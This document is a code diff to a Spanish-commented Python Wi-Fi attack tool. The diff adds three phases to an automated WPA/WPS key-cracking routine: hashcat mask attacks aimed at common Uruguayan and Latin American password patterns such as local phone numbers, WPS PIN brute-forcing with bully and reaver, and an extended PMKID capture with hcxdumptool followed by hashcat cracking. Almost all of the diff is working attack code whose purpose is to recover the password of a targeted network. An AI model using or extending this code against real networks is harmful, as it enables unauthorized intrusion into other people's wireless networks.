@@ -4781,12 +4781,15 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
     Motor de explotación completo con progreso en tiempo real.
     Retorna (clave_o_None, metodo_str).
     Fases:
-      0 – Fingerprint + CVE detection     (10 %)
-      1 – WPS Pixie Dust                  (15 %)
-      2 – WPS Smart PIN + brute parcial   (10 %)
-      3 – PMKID capture + hashcat         (25 %)
-      4 – Handshake capture + deauth      (20 %)
-      5 – Cracking multi-regla + SSID wl  (20 %)
+      0 – Fingerprint + CVE detection     ( 8 %)
+      1 – WPS Pixie Dust                  (12 %)
+      2 – WPS Smart PIN + brute parcial   ( 8 %)
+      3 – PMKID capture + hashcat         (18 %)
+      4 – Handshake capture + deauth      (15 %)
+      5 – Cracking multi-regla + SSID wl  (15 %)
+      6 – Ataque de mascaras hashcat      (12 %)
+      7 – WPS Brute Force (bully+reaver)  ( 7 %)
+      8 – PMKID retry extendido 90s       ( 5 %)
     """
     bssid    = eng.bssid
     channel  = eng.channel
@@ -4796,12 +4799,15 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
     essid_s  = re.sub(r'[^\w\-]', '_', essid)
 
     # Fases con pesos
-    eng.add_phase("Fingerprint & CVE detect",  10)
-    eng.add_phase("WPS Pixie Dust",            15)
-    eng.add_phase("WPS Smart PIN",             10)
-    eng.add_phase("PMKID capture + hashcat",   25)
-    eng.add_phase("Handshake capture + deauth",20)
-    eng.add_phase("Multi-rule cracking",       20)
+    eng.add_phase("Fingerprint & CVE detect",  8)
+    eng.add_phase("WPS Pixie Dust",            12)
+    eng.add_phase("WPS Smart PIN",             8)
+    eng.add_phase("PMKID capture + hashcat",   18)
+    eng.add_phase("Handshake capture + deauth",15)
+    eng.add_phase("Multi-rule cracking",       15)
+    eng.add_phase("Ataque de mascaras",        12)
+    eng.add_phase("WPS Brute Force",           7)
+    eng.add_phase("PMKID retry extendido",     5)
 
     eng.start()
 
@@ -5047,6 +5053,104 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                 clave = km.group(1); metodo = "Handshake + aircrack-ng"
                 eng.done(clave, metodo); return clave, metodo
         eng.update_phase(100)
+
+    # ── FASE 6: Ataque de máscaras (hashcat -a 3) ─────────────────────────────
+    eng.set_phase(6, 0)
+    # Buscar cualquier hash disponible (PMKID o handshake convertido)
+    _hash_files = []
+    for _f in os.listdir("exploit-engine"):
+        if _f.endswith(".hc22000") and essid_s in _f:
+            _path = f"exploit-engine/{_f}"
+            if os.path.exists(_path) and os.path.getsize(_path) > 0:
+                _hash_files.append(_path)
+    # Máscaras comunes para contraseñas WPA en Uruguay/LATAM
+    _MASKS = [
+        ("8 digitos",          "?d?d?d?d?d?d?d?d"),
+        ("9 digitos",          "?d?d?d?d?d?d?d?d?d"),
+        ("10 digitos",         "?d?d?d?d?d?d?d?d?d?d"),
+        ("8 minusculas",       "?l?l?l?l?l?l?l?l"),
+        ("mayus+7 minus",      "?u?l?l?l?l?l?l?l"),
+        ("mayus+6 minus+dig",  "?u?l?l?l?l?l?l?d"),
+        ("palabra+4 digitos",  "?l?l?l?l?d?d?d?d"),
+        ("telefono UY 09x",    "09?d?d?d?d?d?d"),
+        ("telefono UY 2xxx",   "2?d?d?d?d?d?d?d"),
+    ]
+    if _hash_files and check_tool("hashcat"):
+        _hf = _hash_files[0]
+        for mi, (mask_name, mask) in enumerate(_MASKS):
+            eng.update_phase(int(mi / len(_MASKS) * 95))
+            run(f"hashcat -m 22000 {_hf} -a 3 '{mask}' --force --quiet 2>/dev/null",
+                capture=True)
+            pot = run(f"hashcat --show -m 22000 {_hf} 2>/dev/null", capture=True) or ""
+            pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
+            if pm:
+                clave = pm.group(1).strip()
+                metodo = f"Mascara hashcat ({mask_name})"
+                eng.done(clave, metodo); return clave, metodo
+    eng.update_phase(100)
+
+    # ── FASE 7: WPS Brute Force completo con bully ─────────────────────────────
+    eng.set_phase(7, 0)
+    if has_wps and check_tool("bully"):
+        eng.update_phase(10)
+        bully_out = run(
+            f"timeout 120 bully {iface} -b {bssid} -c {channel} "
+            f"-S -F -B -v 3 2>/dev/null",
+            capture=True
+        ) or ""
+        km = re.search(r'WPA PSK[:\s=]+["\']?([^\s"\']{8,})', bully_out, re.I)
+        if km:
+            clave = km.group(1); metodo = "WPS Brute Force (bully)"
+            eng.done(clave, metodo); return clave, metodo
+        eng.update_phase(80)
+        # Fallback: reaver brute full si bully no lo logra
+        if check_tool("reaver"):
+            rvr_out = run(
+                f"timeout 120 reaver -i {iface} -b {bssid} -c {channel} "
+                f"-N -S -vv 2>/dev/null",
+                capture=True
+            ) or ""
+            km = re.search(r'WPA PSK[:\s]+["\']?([^\s"\']{8,})', rvr_out, re.I)
+            if km:
+                clave = km.group(1); metodo = "WPS Brute Force (reaver)"
+                eng.done(clave, metodo); return clave, metodo
+    eng.update_phase(100)
+
+    # ── FASE 8: PMKID retry extendido (90s) ───────────────────────────────────
+    eng.set_phase(8, 0)
+    if check_tool("hcxdumptool") and ("WPA2" in priv or "WPA3" in priv):
+        pcap2 = f"exploit-engine/pmkid2_{essid_s}.pcapng"
+        hc222 = f"exploit-engine/pmkid2_{essid_s}.hc22000"
+        run(f"rm -f {pcap2} {hc222} 2>/dev/null")
+        eng.update_phase(5)
+        cap2 = subprocess.Popen(
+            f"hcxdumptool -i {iface} -o {pcap2} "
+            f"--filterlist_ap={bssid} --filtermode=2 "
+            f"--active_beacon --enable_status=3 2>/dev/null",
+            shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        for tick in range(90):
+            eng.update_phase(5 + int(tick / 90 * 80))
+            time.sleep(1)
+        cap2.terminate(); cap2.wait()
+        eng.update_phase(88)
+        if os.path.exists(pcap2) and check_tool("hcxpcapngtool"):
+            run(f"hcxpcapngtool -o {hc222} {pcap2} 2>/dev/null", capture=True)
+        if os.path.exists(hc222) and os.path.getsize(hc222) > 0 and check_tool("hashcat"):
+            ssid_wl2 = f"exploit-engine/ssid_{essid_s}.txt"
+            _gen_ssid_wordlist(essid, ssid_wl2, bssid)
+            for wl in [ssid_wl2, wordlist]:
+                if not wl or not os.path.exists(wl): continue
+                run(f"hashcat -m 22000 {hc222} {wl} --force --quiet 2>/dev/null",
+                    capture=True)
+                pot = run(f"hashcat --show -m 22000 {hc222} 2>/dev/null",
+                          capture=True) or ""
+                pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
+                if pm:
+                    clave = pm.group(1).strip(); metodo = "PMKID retry + hashcat"
+                    eng.done(clave, metodo); return clave, metodo
+    eng.update_phase(100)
 
     eng.done(None, "sin_resultado")
     return None, "sin_resultado"
